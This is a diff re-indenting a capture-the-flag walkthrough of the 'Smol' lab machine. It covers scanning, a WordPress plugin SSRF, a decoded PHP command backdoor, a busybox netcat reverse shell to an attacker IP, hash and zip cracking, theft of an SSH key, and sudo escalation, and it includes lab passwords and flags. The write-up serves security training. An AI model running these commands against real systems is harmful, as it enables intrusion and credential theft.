@@ -31,20 +31,20 @@ An Nmap scan was performed to identify open ports and services running on the ta
 
 Nmap Output - Initial Findings:
 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 05:02 UTC
-Nmap scan report for 10.10.231.99
-Host is up (0.093s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
-|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
-|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Did not follow redirect to http://www.smol.thm
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 05:02 UTC
+    Nmap scan report for 10.10.231.99
+    Host is up (0.093s latency).
+    Not shown: 998 closed tcp ports (reset)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+    |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+    |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+    |_http-title: Did not follow redirect to http://www.smol.thm
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
@@ -104,7 +104,7 @@ WPScan Vulnerability Scan
 
 To specifically identify vulnerabilities within the WordPress installation, wpscan was utilized with a provided API token.
 
-wpscan --url http://www.smol.thm --api-token REDACTED
+    wpscan --url http://www.smol.thm --api-token REDACTED
 
 WPScan was instrumental in identifying potential vulnerabilities, leading to the discovery of the exploitable jsmol2wp plugin.
 
@@ -142,19 +142,19 @@ Discovering and Decoding the Backdoor
 
 While exploring the WordPress admin area, a file named hello.php was identified. The SSRF vulnerability was reused to read its content:
 
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+    http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
 
 The file contained a base64 encoded string:
 
-CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=
+    CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=
 
 Decoding this string revealed a simple PHP backdoor:
 
-if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
+    if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
 
 Which, after resolving the octal and hexadecimal escape sequences, translates to:
 
-if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
+    if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 
 This backdoor allows for arbitrary command execution on the server by passing commands via the cmd GET parameter.
 
@@ -167,18 +167,18 @@ A busybox nc reverse shell payload was constructed. To ensure proper execution t
 
 Reverse Shell Payload (Encoded for URL):
 
-echo "busybox nc 10.6.48.108 4445 -e sh" | base64 <- Change your attckers IP
-Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo
+    echo "busybox nc 10.6.48.108 4445 -e sh" | base64 <- Change your attckers IP
+    Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo
 
 The encoded payload was then executed via the cmd parameter in the URL:
 
-http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ0LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash
+    http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ0LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash
 
 Setting up the Netcat Listener
 
 Prior to executing the payload, a Netcat listener was set up on the attacking machine (10.6.48.108) on port 4445 to receive the incoming connection.
 
-nc -lvnp 4445
+    nc -lvnp 4445
 
 Upon executing the URL, the Netcat listener successfully caught the shell:
 
@@ -190,7 +190,7 @@ Spawning a Better Shell
 
 To gain a fully interactive shell, a Python PTY was spawned from the existing shell:
 
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 This established a fully functional shell, ready for further enumeration and privilege escalation.
 
@@ -201,16 +201,16 @@ MySQL Database Access
 
 The wpuser credentials obtained from wp-config.php were used to access the MySQL database.
 
-mysql -u wpuser -p
-Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
+    mysql -u wpuser -p
+    Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
 
 Dumping wp_users Table
 
 Inside the MySQL prompt, the wordpress database was selected, and the wp_users table was queried to extract user hashes.
 
-show databases;
-use wordpress;
-select * from wp_users;
+    show databases;
+    use wordpress;
+    select * from wp_users;
 
 The query returned the following user information and their password hashes:
 
@@ -230,21 +230,22 @@ The query returned the following user information and their password hashes:
 The hash for the user diego ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1) was extracted and saved to a file. John the Ripper was then used with the phpass format and the rockyou.txt wordlist to crack the password.
 
 Save diego's hash to a file, e.g., diego_hash.txt
-john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt diego_hash.txt
+    john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt diego_hash.txt
 
 The cracked password for diego was found to be sandiegocalifornia.
 Switching User to diego and Finding user.txt
 
 With diego's password, it was possible to switch user from www-data to diego.
 
-su diego
+    su diego
 Password: sandiegocalifornia
 
 After successfully switching, the user.txt flag was located in diego's home directory.
 
-cat user.txt
+    cat user.txt
 
 User Flag: 45edaec653ff9ee06236b7ce72b86963
+
 # 5. Privilege Escalation to think
 
 Further enumeration was performed to identify a path to higher privileges.
@@ -252,21 +253,22 @@ Locating think's SSH Private Key
 
 While exploring diego's environment, it was discovered that the user think had an SSH private key (id_rsa) stored in their .ssh directory.
 
-cd /home/think/.ssh/
-cat id_rsa
+    cd /home/think/.ssh/
+    cat id_rsa
 
 The contents of id_rsa were copied.
 Using the SSH Key to Login as think
 
 The copied id_rsa content was saved to a file on the attacking machine (e.g., think_id_rsa). The permissions of the private key file were then set correctly to 600.
 
-chmod 600 think_id_rsa
+    chmod 600 think_id_rsa
 
 Finally, SSH was used to log in as think using the private key.
 
-ssh -i think_id_rsa think@10.10.109.27
+    ssh -i think_id_rsa think@10.10.109.27
 
 This granted a shell as the user think.
+
 # 6. Privilege Escalation to xavi
 
 The next step involved finding credentials for another user to continue the privilege escalation chain.
@@ -276,16 +278,16 @@ During enumeration, a file named wordpress.old.zip was found in gege's home dire
 
 On the target machine (as think, assuming appropriate file access):
 
-python3 -m http.server 9000
+    python3 -m http.server 9000
 
 Then, on the attacking machine, the file was downloaded:
 
-wget http://10.10.109.27:9000/wordpress.old.zip
+    wget http://10.10.109.27:9000/wordpress.old.zip
 
 The wordpress.old.zip file was password-protected. zip2john was used to extract the hash, and then John the Ripper with the rockyou.txt wordlist was used to crack the password.
 
-zip2john wordpress.old.zip > zip_hash.txt
-john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    zip2john wordpress.old.zip > zip_hash.txt
+    john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 The password for the zip file was found to be hero_gege@hotmail.com.
 Extracting xavi's Credentials
@@ -300,8 +302,8 @@ Switching User to xavi
 
 With xavi's credentials, it was possible to switch user from think to xavi.
 
-su xavi
-Password: P@ssw0rdxavi@
+    su xavi
+    Password: P@ssw0rdxavi@
 
 # 7. Privilege Escalation to root
 
@@ -310,7 +312,7 @@ Checking xavi's Sudo Privileges
 
 Once logged in as xavi, the sudo -l command was executed to check xavi's sudo privileges.
 
-sudo -l
+    sudo -l
 
 The output indicated that xavi had full sudo privileges, allowing them to run any command as any user (including root) without requiring a password.
 
@@ -326,14 +328,15 @@ Gaining Root Access and Finding root.txt
 
 With full sudo privileges, xavi could easily become root.
 
-sudo su
+    sudo su
 
 Finally, the root.txt flag was located in the /root directory.
 
-cd /root
-cat root.txt
+    cd /root
+    cat root.txt
 
 Root Flag: bf89ea3ea01992353aef1f576214d4e4
+
 # 8. Conclusion
 
 The Smol.thm machine was successfully exploited by chaining multiple vulnerabilities and privilege escalation techniques. The process involved:
